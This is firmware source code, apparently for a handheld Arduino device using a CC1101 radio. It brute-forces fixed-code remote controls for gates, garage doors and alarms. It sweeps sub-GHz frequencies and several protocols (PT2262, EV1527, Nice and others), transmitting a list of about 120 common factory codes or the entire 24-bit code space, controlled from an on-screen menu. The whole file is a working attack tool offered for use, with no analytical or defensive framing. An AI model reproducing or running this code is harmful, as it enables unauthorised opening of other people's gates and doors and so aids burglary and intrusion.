#include "config.h"

// Frequências para brute force (em kHz)
const uint32_t BRUTE_FREQS[] = {
  300000, 303000, 304000, 305000, 310000, 315000, 318000,
  330000, 390000, 418000, 433000, 433920, 434000, 868000, 868350, 915000
};
const int NUM_BRUTE_FREQS = sizeof(BRUTE_FREQS) / sizeof(BRUTE_FREQS[0]);

// Protocolos
struct RCSwitchProtocol {
  const char* name;
  uint16_t pulseLength;
  uint8_t syncFactor[2];
  uint8_t zero[2];
  uint8_t one[2];
};

const RCSwitchProtocol protocols[] = {
  {"PT2262",   350, {1,31}, {1,3}, {3,1}},
  {"EV1527",   350, {1,31}, {1,3}, {3,1}},
  {"Kaku",     650, {1,10}, {1,2}, {2,1}},
  {"HT12E",    450, {1,23}, {1,3}, {3,1}},
  {"Nice",     700, {1,20}, {1,2}, {2,1}},
  {"V2",       650, {1,10}, {1,2}, {2,1}},
};
const int NUM_PROTOCOLS = sizeof(protocols) / sizeof(protocols[0]);

// CÓDIGOS COMUNS E DE FÁBRICA (~120 códigos = ~6 segundos por protocolo)
const uint32_t COMMON_CODES[] = {
  0x000000, 0xFFFFFF, 0x123456, 0x654321, 0x111111, 0x222222,
  0x333333, 0x444444, 0x555555, 0x666666, 0x777777, 0x888888,
  0x999999, 0xAAAAAA, 0xBBBBBB, 0xCCCCCC, 0xDDDDDD, 0xEEEEEE,
  0xABCDEF, 0xFEDCBA, 0xAABBCC, 0x112233, 0x445566, 0x778899,
  0x010101, 0x101010, 0x121212, 0x212121, 0x343434, 0x434343,
  0x565656, 0x656565, 0x787878, 0x878787, 0x909090, 0x090909,
  0x000001, 0x000002, 0x000003, 0x000004, 0x000005, 0x00000A,
  0x00000F, 0x000010, 0x000020, 0x000030, 0x000040, 0x000050,
  0x000060, 0x000070, 0x000080, 0x000090, 0x0000A0, 0x0000B0,
  0x0000C0, 0x0000D0, 0x0000E0, 0x0000F0, 0x001000, 0x002000,
  0x003000, 0x004000, 0x005000, 0x006000, 0x007000, 0x008000,
  0x009000, 0x00A000, 0x00B000, 0x00C000, 0x00D000, 0x00E000,
  0x00F000, 0x010000, 0x020000, 0x030000, 0x040000, 0x050000,
  0x060000, 0x070000, 0x080000, 0x090000, 0x0A0000, 0x0B0000,
  0x0C0000, 0x0D0000, 0x0E0000, 0x0F0000, 0x100000, 0x200000,
  0x300000, 0x400000, 0x500000, 0x600000, 0x700000, 0x800000,
  0x900000, 0xA00000, 0xB00000, 0xC00000, 0xD00000, 0xE00000,
  0xF00000, 0xFFFFFF, 0x555555, 0xAAAAAA, 0xCCCCCC, 0x333333,
  0x0F0F0F, 0xF0F0F0, 0xFF00FF, 0x00FF00, 0xFFFF00, 0x00FFFF,
};
const int NUM_COMMON_CODES = sizeof(COMMON_CODES) / sizeof(COMMON_CODES[0]);

namespace {
  enum BFMode { BF_MODE_COMMON, BF_MODE_FULL };
  BFMode bfMode = BF_MODE_COMMON;
  enum BFState { BF_IDLE, BF_RUNNING, BF_PAUSED };
  BFState bfState = BF_IDLE;
  int bfFreqIndex = 0;
  int bfProtocolIndex = 0;
  uint32_t bfCode = 0;
  int bfCodeIndex = 0;
  unsigned long bfStartTime = 0;
  int bfCodesSent = 0;
}

void transmitBit(const RCSwitchProtocol& p, bool bit) {
  const uint8_t* timing = bit ? p.one : p.zero;
  digitalWrite(CC_GDO0, HIGH);
  delayMicroseconds(p.pulseLength * timing[0]);
  digitalWrite(CC_GDO0, LOW);
  delayMicroseconds(p.pulseLength * timing[1]);
}

void transmitSync(const RCSwitchProtocol& p) {
  digitalWrite(CC_GDO0, HIGH);
  delayMicroseconds(p.pulseLength * p.syncFactor[0]);
  digitalWrite(CC_GDO0, LOW);
  delayMicroseconds(p.pulseLength * p.syncFactor[1]);
}

void transmitCode(uint32_t code, int bits, const RCSwitchProtocol& p) {
  transmitSync(p);
  for (int i = bits - 1; i >= 0; i--) {
    bool bit = (code >> i) & 1;
    transmitBit(p, bit);
  }
  digitalWrite(CC_GDO0, LOW);
}

void cc1101BruteForceSetup() {
  bfState = BF_IDLE;
  bfMode = BF_MODE_COMMON;
  bfFreqIndex = 0;
  bfProtocolIndex = 0;
  bfCode = 0;
  bfCodeIndex = 0;
  bfStartTime = 0;
  bfCodesSent = 0;
  
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 10, "CC1101 BruteForce");
  u8g2.drawStr(0, 22, "SEL: Iniciar/Parar");
  u8g2.drawStr(0, 34, "UP: Modo Comum/Full");
  u8g2.drawStr(0, 46, "DOWN: Prox. Freq");
  u8g2.drawStr(0, 58, "BACK: Menu");
  u8g2.sendBuffer();
}

void cc1101BruteForceLoop() {
  if (buttonPressed(BTN_BACK)) {
    bfState = BF_IDLE;
    ELECHOUSE_cc1101.setSidle();
    current_screen = 0;
    delay(200);
    return;
  }
  
  if (buttonPressed(BTN_SELECT)) {
    if (bfState == BF_IDLE || bfState == BF_PAUSED) {
      bfState = BF_RUNNING;
      bfStartTime = millis();
      bfCodesSent = 0;
      bfCodeIndex = 0;
      bfCode = 0;
      
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[bfFreqIndex] / 1000.0);
      ELECHOUSE_cc1101.setModulation(0);
      ELECHOUSE_cc1101.setPA(12);
      ELECHOUSE_cc1101.SetTx();
      delay(5);
      pinMode(CC_GDO0, OUTPUT);
      digitalWrite(CC_GDO0, LOW);
    } else {
      bfState = BF_PAUSED;
      digitalWrite(CC_GDO0, LOW);
      ELECHOUSE_cc1101.setSidle();
    }
    delay(200);
  }
  
  if (buttonPressed(BTN_UP) && bfState != BF_RUNNING) {
    bfMode = (bfMode == BF_MODE_COMMON) ? BF_MODE_FULL : BF_MODE_COMMON;
    bfCodeIndex = 0;
    bfCode = 0;
    delay(150);
  }
  
  if (buttonPressed(BTN_DOWN) && bfState != BF_RUNNING) {
    bfFreqIndex = (bfFreqIndex + 1) % NUM_BRUTE_FREQS;
    bfCodeIndex = 0;
    bfCode = 0;
    delay(150);
  }
  
  // Display
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 10, "BruteForce");
  
  u8g2.setCursor(0, 22);
  if (bfState == BF_RUNNING) u8g2.print("Status: ATIVO");
  else if (bfState == BF_PAUSED) u8g2.print("Status: PAUSADO");
  else u8g2.print("Status: PARADO");
  
  u8g2.setCursor(0, 34);
  u8g2.print("Freq: ");
  u8g2.print(BRUTE_FREQS[bfFreqIndex] / 1000.0, 2);
  u8g2.print(" MHz");
  
  u8g2.setCursor(0, 46);
  u8g2.print("Proto: ");
  u8g2.print(protocols[bfProtocolIndex].name);
  
  u8g2.setCursor(0, 58);
  if (bfMode == BF_MODE_COMMON) {
    u8g2.print("Modo: COMUM (rapido)");
  } else {
    u8g2.print("Modo: FULL (lento)");
  }
  u8g2.sendBuffer();
  
  // Executa brute force
  if (bfState == BF_RUNNING) {
    const RCSwitchProtocol& p = protocols[bfProtocolIndex];
    unsigned long elapsed = millis() - bfStartTime;
    
    if (bfMode == BF_MODE_COMMON) {
      // MODO RÁPIDO: ~120 códigos em ~6 segundos por protocolo
      if (bfCodeIndex < NUM_COMMON_CODES) {
        transmitCode(COMMON_CODES[bfCodeIndex], 24, p);
        delayMicroseconds(5000);
        bfCodeIndex++;
        bfCodesSent++;
      } else {
        // Terminou códigos comuns, avança protocolo
        bfCodeIndex = 0;
        bfProtocolIndex = (bfProtocolIndex + 1) % NUM_PROTOCOLS;
        if (bfProtocolIndex == 0) {
          bfFreqIndex = (bfFreqIndex + 1) % NUM_BRUTE_FREQS;
          ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[bfFreqIndex] / 1000.0);
        }
      }
    } else {
      // MODO FULL: Varredura completa (MUITO lenta)
      transmitCode(bfCode, 24, p);
      delayMicroseconds(5000);
      bfCode++;
      bfCodesSent++;
      if (bfCode > 0xFFFFFF) {
        bfCode = 0;
        bfProtocolIndex = (bfProtocolIndex + 1) % NUM_PROTOCOLS;
        if (bfProtocolIndex == 0) {
          bfFreqIndex = (bfFreqIndex + 1) % NUM_BRUTE_FREQS;
          ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[bfFreqIndex] / 1000.0);
        }
      }
    }
    
    // Atualiza progresso a cada 50 códigos
    if (bfCodesSent % 50 == 0) {
      u8g2.setCursor(80, 58);
      u8g2.print(bfCodesSent);
      u8g2.sendBuffer();
    }
    
    // Auto-pausa após 2 minutos no modo comum
    if (bfMode == BF_MODE_COMMON && elapsed > 120000) {
      bfState = BF_PAUSED;
      digitalWrite(CC_GDO0, LOW);
      ELECHOUSE_cc1101.setSidle();
    }
  }
}

